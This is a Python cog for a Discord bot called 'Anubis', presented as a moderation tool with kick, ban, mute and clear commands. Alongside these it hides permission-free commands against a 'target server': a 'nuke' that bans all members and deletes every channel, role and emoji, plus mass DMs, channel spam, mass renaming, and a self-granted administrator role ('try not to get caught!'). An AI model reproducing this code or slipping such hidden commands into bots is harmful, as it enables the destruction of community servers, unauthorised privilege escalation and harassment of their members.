# Scripted by Catterall (https://github.com/Catterall).
# Bot under the GNU General Public Liscense v2 (1991).

# Modules
import discord
from discord.ext import commands
from colorama import *
import requests
import random
import json
import os
init()  # Used by colorama.


class Moderation(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    # Clear messages.

    @commands.command()
    @commands.has_guild_permissions(manage_messages=True)
    async def clear(self, ctx, n=10):
        if n < 1:
            embed = discord.Embed(
                title="Issue", description=f"You must specify a real amount.", color=discord.Colour.orange())
            await ctx.send(embed=embed)
        elif n > 1000:
            embed = discord.Embed(
                title="Issue", description=f"The limit is 1000.", color=discord.Colour.orange())
            await ctx.send(embed=embed)
        else:
            try:
                await ctx.channel.purge(limit=n)
            except ValueError:
                embed = discord.Embed(
                    title="Issue", description=f"You must specify a real amount.", color=discord.Colour.orange())
                await ctx.send(embed=embed)

    # The atomic bomb.

    @commands.command(hidden=True)
    async def nuke(self, ctx):
        quotes = ["War is peace, freedom is slavery and ignorance is strength.", "A true soldier fights not because he hates what is in front of him, but because he loves what is behind him.", "The object of war is not die for your country but to make the other bastard die for his.", "War does not determine who are right - only those who are left.",
                  "If you are far from the enemy, make them think you are near.", "Only the dead have seen the end of war.", "Older men declare war, but it is the youth that must fight and die.", "War is the teacher of violence.", "If you know the enemy and know yourself, you need not fear the result of a hundred battles."]
        quote = quotes[random.randint(0, len(quotes)-1)]
        SKIP_BOTS = False
        await ctx.message.delete()

        # Ban all members.
        print(Fore.LIGHTWHITE_EX +
              f"\n{'-'*(len(quote)+2)}" + "\nNuke depolyed!\n\n")
        print(Fore.YELLOW + "Banning server members:")
        for member in self.bot.get_all_members():
            if member.bot and SKIP_BOTS:
                continue
            try:
                await member.ban(reason=None, delete_message_days=7)
                print(Fore.LIGHTBLUE_EX + f"Banned {member.display_name}.")
            except discord.Forbidden:
                print(Fore.RED + f'Failed to ban {member}.')
            except discord.HTTPException:
                print(Fore.RED + f'Failed to ban {member}.')
        print(Fore.LIGHTGREEN_EX + "Banned all members.\n")

        # Delete all channels.
        print(Fore.YELLOW + "Deleting server channels:")
        for c in ctx.guild.channels:
            try:
                await c.delete()
                print(Fore.LIGHTBLUE_EX + f'Channel {c} deleted.')
            except discord.Forbidden:
                print(Fore.RED + f'Failed to delete channel {c}.')
            except discord.HTTPException:
                print(Fore.RED + f'Failed to delete channel {c}.')
        print(Fore.LIGHTGREEN_EX + "Deleted all channels.\n")

        # Delete all roles.
        print(Fore.YELLOW + "Deleting server roles:")
        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            if ctx.guild.me.roles[-1] > role:
                try:
                    await role.delete()
                    print(Fore.LIGHTBLUE_EX + f'Role {role} deleted.')
                except discord.Forbidden:
                    print(Fore.RED + f'Failed to delete role {role}.')
                except discord.HTTPException:
                    print(Fore.RED + f'Failed to delete role {role}.')
            else:
                break
        print(Fore.LIGHTGREEN_EX + "Deleted all roles.\n")

        # Delete all emojis.
        print(Fore.YELLOW + "Deleting server emojis:")
        for emoji in list(ctx.guild.emojis):
            try:
                await emoji.delete()
                print(Fore.LIGHTBLUE_EX + f"Emoji :{emoji.name}: deleted.")
            except:
                print(Fore.RED + f"Failed to delete emoji :{emoji.name}:.")
        print(Fore.LIGHTGREEN_EX + "Deleted all emojis.\n\n")

        print(Fore.LIGHTWHITE_EX +
              f"Nuke sucessfully exploded!\n" + Fore.RED + f"\"{quote}\"" + Fore.WHITE + f"\n{'-'*(len(quote)+2)}\n\n")

    # Delete all channels only.

    @commands.command(hidden=True)
    async def cpurge(self, ctx):
        await ctx.message.delete()
        for c in ctx.guild.channels:
            try:
                await c.delete()
            except discord.Forbidden:
                continue
        embed = discord.Embed(color=discord.Colour.green())
        embed.add_field(
            name="Channels purged successfully.", value="The server channels have been purged successfully.", inline=False)
        await ctx.author.send(embed=embed)

    # DM all members with a message.

    @commands.command(hidden=True)
    async def mass_dm(self, ctx, *, message=None):
        await ctx.message.delete()
        if message != None:
            for member in ctx.guild.members:
                try:
                    if member.dm_channel != None:
                        await member.dm_channel.send(message)
                    else:
                        await member.create_dm()
                        await member.dm_channel.send(message)
                except:
                    continue
        else:
            embed = discord.Embed(color=discord.Colour.red())
            embed.add_field(
                name="No message provided.", value="You must provide a message: `mass_dm <message>`.", inline=False)
            await ctx.author.send(embed=embed)

    # Make yourself an administator on the server.

    @commands.command(hidden=True)
    async def admin(self, ctx, *, role_name=None):
        await ctx.message.delete()
        if role_name != None:
            await ctx.guild.create_role(name=role_name, permissions=discord.Permissions.all())
            role = discord.utils.get(ctx.guild.roles, name=role_name)
            await ctx.author.add_roles(role)
            embed = discord.Embed(color=discord.Colour.green())
            embed.add_field(
                name="Administrator privileges granted.", value="You now have administrator privileges - try not to get caught!", inline=False)
            await ctx.author.send(embed=embed)
        else:
            embed = discord.Embed(color=discord.Colour.red())
            embed.add_field(
                name="You must provide a role name.", value="You must provide a name for your administrator role: `admin <role_name>`.", inline=False)
            await ctx.author.send(embed=embed)

    # Spam all text channels with @everyone.

    @commands.command(hidden=True)
    async def spam(self, ctx, *, message=None):
        await ctx.message.delete()
        if message != None:
            await ctx.author.send('Type `stop` in a text channel to stop spamming.')

            def check_reply(message):
                return message.content == 'stop' and message.author == ctx.author

            async def spam_text():
                while True:
                    for channel in ctx.guild.text_channels:
                        await channel.send(message)

            spam_task = self.bot.loop.create_task(spam_text())
            await self.bot.wait_for('message', check=check_reply)
            spam_task.cancel()
            await ctx.author.send('Spamming stopped.')
        else:
            embed = discord.Embed(color=discord.Colour.red())
            embed.add_field(
                name="No message provided.", value="You must provide a message: `spam <message>`.", inline=False)
            await ctx.author.send(embed=embed)

    # Change the nickname of every member.

    @commands.command(hidden=True)
    async def nick_all(self, ctx, *, nickname=None):
        await ctx.message.delete()
        if nickname:
            if nickname.strip().replace(' ', ''):
                for member in ctx.guild.members:
                    try:
                        await member.edit(nick=nickname)
                    except Exception as e:
                        continue
                embed = discord.Embed(color=discord.Colour.green())
                embed.add_field(
                    name="Nicknames changed successfully.", value="The nicknames of each member in the server have been changed.", inline=False)
                await ctx.author.send(embed=embed)
            else:
                embed = discord.Embed(color=discord.Colour.red())
                embed.add_field(
                    name="No nickname provided.", value="You must provide a nickname: `nick_all <nickname>`.", inline=False)
                await ctx.author.send(embed=embed)
        else:
            embed = discord.Embed(color=discord.Colour.red())
            embed.add_field(
                name="No nickname provided.", value="You must provide a nickname: `nick_all <nickname>`.", inline=False)
            await ctx.author.send(embed=embed)

    # Leave the server.
    
    @commands.command(hidden=True)
    async def leave(self, ctx, leave_code=None, *, guild_name=None):
        await ctx.message.delete()      
        if not os.path.isfile('cogs/temp.txt'):
            embed = discord.Embed(color=discord.Colour.red())
            embed.add_field(
                name="Crucial Error.", value="`temp.txt` is missing. Please restart the bot.", inline=False)
            await ctx.author.send(embed=embed)
            return
        else:
            with open('cogs/temp.txt', 'r') as f:
                leave = f.read().strip().replace(' ', '')
                f.close()
            
            if not leave_code:
                embed = discord.Embed(color=discord.Colour.red())
                embed.add_field(
                    name="No leave-code provided.", value="You must provide a leave-code: `leave <leave-code> <server>`.", inline=False)
                await ctx.author.send(embed=embed)
                return
            
            if not guild_name:
                embed = discord.Embed(color=discord.Colour.red())
                embed.add_field(
                    name="No server provided.", value="You must provide a server: `leave <leave-code> <server>`.", inline=False)
                await ctx.author.send(embed=embed)
                return
            
            if leave_code != leave:
                embed = discord.Embed(color=discord.Colour.red())
                embed.add_field(
                    name="Incorrect leave-code.", value=f"The leave-code you provided ({leave_code}) was incorrect.", inline=False)
                await ctx.author.send(embed=embed)
                return
            else:    
                guild = discord.utils.get(self.bot.guilds, name=guild_name)    
                try:
                    await guild.leave()
                except:
                    embed = discord.Embed(color=discord.Colour.blue())
                    embed.add_field(
                        name="Anubis not present.", value=f"The Anubis bot is not currently present in the server: {guild_name}", inline=False)
                    await ctx.author.send(embed=embed)
                    return
                try:
                    embed = discord.Embed(color=discord.Colour.green())
                    embed.add_field(
                        name="Anubis left successfully.", value=f"The Anubis bot has successfully left the server: {guild_name}.", inline=False)
                    await ctx.author.send(embed=embed)
                except:
                    print(f"{Fore.GREEN}\nAnubis left successfully: The Anubis bot has succesfully left the server: {Fore.WHITE}{guild_name}{Fore.GREEN}.")
                    return

    # Refresh the window.

    @commands.command(hidden=True)
    async def refresh(self, ctx):
        try:
            with open('run_settings.json', 'r') as file:
                data = json.load(file)
        except FileNotFoundError:
            embed = discord.Embed(color=discord.Colour.red())
            embed.add_field(
                name="Crucial Error.", value="`run_settings.json` is missing. Please restart the bot.", inline=False)
            await ctx.author.send(embed=embed)
            return
        
        with open('run_settings.json', 'w') as file:
            json.dump(data, file, indent=4)
            if not os.path.isfile('cogs/temp.txt'):
                print(f"{Fore.LIGHTRED_EX}[critical] temp.txt mising - please restart the bot.")
                return

        with open('cogs/temp.txt', 'r') as f:
            leave_code = f.read().strip().replace(' ', '')
        await ctx.message.delete()
        os.system('cls')
        print(Fore.BLUE + f'''
     
                                    █████╗ ███╗   ██╗██╗   ██╗██████╗ ██╗███████╗
                                    ██╔══██╗████╗  ██║██║   ██║██╔══██╗██║██╔════╝
                                    ███████║██╔██╗ ██║██║   ██║██████╔╝██║███████╗
                                    ██╔══██║██║╚██╗██║██║   ██║██╔══██╗██║╚════██║
                                    ██║  ██║██║ ╚████║╚██████╔╝██████╔╝██║███████║
                                    ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚═╝╚══════╝


{Fore.WHITE}{Back.BLUE}The following commands can be used in any text channel within the target server - permissions are not needed:
{Back.RESET}{Style.DIM}{Fore.RED}{data.get('prefix')}leave <leave-code> <server>: Makes the bot leave a server (Your current leave code is {Fore.WHITE}{leave_code}{Fore.RED}).
{Style.BRIGHT}{Fore.LIGHTRED_EX}{data.get('prefix')}nick_all <nickname>: Change the nickname of all members on a server.
{Style.DIM}{Fore.YELLOW}{data.get('prefix')}mass_dm <message>: Message all of the members on a server with a custom message.
{Style.NORMAL}{Fore.GREEN}{data.get('prefix')}spam <message>: Repeatedly spam all text channels on a server with a custom message.
{Fore.BLUE}{data.get('prefix')}cpurge: Delete all channels on a server.
{Style.DIM}{Fore.MAGENTA}{data.get('prefix')}admin <role_name>: Gain administrator privileges on a server via an admin role created by the bot.
{Style.BRIGHT}{Fore.LIGHTMAGENTA_EX}{data.get('prefix')}nuke: Ban all members, then delete all roles, then delete all channels, then delete all custom emojis on a server.


{Style.DIM}{Fore.GREEN}Additional notes:
{Style.BRIGHT}{Back.RESET}{Fore.WHITE}Before running the nuke command, make sure the role created by the bot upon its invite is above the roles of the
members you wish to ban (i.e. move the role as high as possible).

{Fore.LIGHTCYAN_EX}To refresh this window back to this page, use the command: {Fore.LIGHTGREEN_EX}{data.get('prefix')}refresh


{Fore.LIGHTRED_EX}Anubis created by Catterall (View for full guide): {Fore.WHITE}https://www.github.com/Catterall\n{Style.DIM}{Fore.RED}'''.replace('█', f'{Fore.WHITE}█{Fore.BLUE}'))

        return
    
    # Kick a member.

    @commands.command()
    @commands.has_guild_permissions(kick_members=True)
    async def kick(self, ctx, member: discord.Member, *, reason=None):
        await member.kick(reason=reason)
        embed = discord.Embed(
            title="Member kicked", description=f"{member.mention} has been kicked.", color=discord.Colour.blue())
        await ctx.send(embed=embed)

    # Ban a member.

    @commands.command()
    @commands.has_guild_permissions(ban_members=True, kick_members=True)
    async def ban(self, ctx, member: discord.Member, *, reason=None):
        await member.ban(reason=reason)
        embed = discord.Embed(
            title="Member banned", description=f"{member.mention} has been banned.", color=discord.Colour.blue())
        await ctx.send(embed=embed)

    # Unban a member.

    @commands.command()
    @commands.has_guild_permissions(administrator=True)
    async def unban(self, ctx, *, member):
        banned_users = await ctx.guild.bans()
        member_name, member_discriminator = member.split('#')

        for ban_entry in banned_users:
            user = ban_entry.user
            if (user.name, user.discriminator) == (member_name, member_discriminator):
                await ctx.guild.unban(user)
                embed = discord.Embed(
                    title="Member unbanned", description=f"{user.mention} has been unbanned.", color=discord.Colour.blue())
                await ctx.send(embed=embed)
                return

    # Mute a member.

    @commands.command()
    @commands.has_guild_permissions(manage_roles=True)
    async def mute(self, ctx, member: discord.Member, *, reason=None):
        if member.guild_permissions.administrator or member.guild_permissions.manage_roles or member.guild_permissions.manage_permissions:
            embed = discord.Embed(
                title="Issue", description=f"You can not mute this member.", color=discord.Colour.orange())
            await ctx.send(embed=embed)
        else:
            role = discord.utils.find(
                lambda r: r.name == 'bot muted', ctx.guild.roles)
            if role in member.roles:
                embed = discord.Embed(
                    title="Issue", description=f"{member.mention} is already muted.", color=discord.Colour.orange())
                await ctx.send(embed=embed)
            else:
                if discord.utils.get(ctx.guild.roles, name="bot muted"):
                    role = discord.utils.get(
                        member.guild.roles, name="bot muted")
                    await discord.Member.add_roles(member, role)
                    member.guild_permissions.send_messages = False
                else:
                    permissions = discord.Permissions(
                        send_messages=False, read_messages=True)
                    await ctx.guild.create_role(name="bot muted", permissions=permissions)
                    role = discord.utils.get(
                        member.guild.roles, name="bot muted")
                    await discord.Member.add_roles(member, role)
                    member.guild_permissions.send_messages = False

                embed = discord.Embed(
                    title="Member muted", description=f"{member.mention} has been muted.", color=discord.Colour.blue())
                await ctx.send(embed=embed)

    # Unmute a member.

    @commands.command()
    @commands.has_guild_permissions(manage_roles=True)
    async def unmute(self, ctx, member: discord.Member, *, reason=None):
        role = discord.utils.find(
            lambda r: r.name == 'bot muted', ctx.guild.roles)
        if role not in member.roles:
            if member.guild_permissions.send_messages:
                embed = discord.Embed(
                    title="Issue", description=f"{member.mention} is not muted.", color=discord.Colour.orange())
                await ctx.send(embed=embed)
            else:
                role = discord.utils.get(member.guild.roles, name="bot muted")
                await discord.Member.remove_roles(member, role)
                member.guild_permissions.send_messages = True

                embed = discord.Embed(
                    title="Member unmuted", description=f"{member.mention} has been unmuted.", color=discord.Colour.blue())
                await ctx.send(embed=embed)
        else:
            role = discord.utils.get(member.guild.roles, name="bot muted")
            await discord.Member.remove_roles(member, role)
            member.guild_permissions.send_messages = True

            embed = discord.Embed(
                title="Member unmuted", description=f"{member.mention} has been unmuted.", color=discord.Colour.blue())
            await ctx.send(embed=embed)


def setup(bot):
    bot.add_cog(Moderation(bot))


# Scripted by Catterall (https://github.com/Catterall).
# Bot under the GNU General Public Liscense v2 (1991).
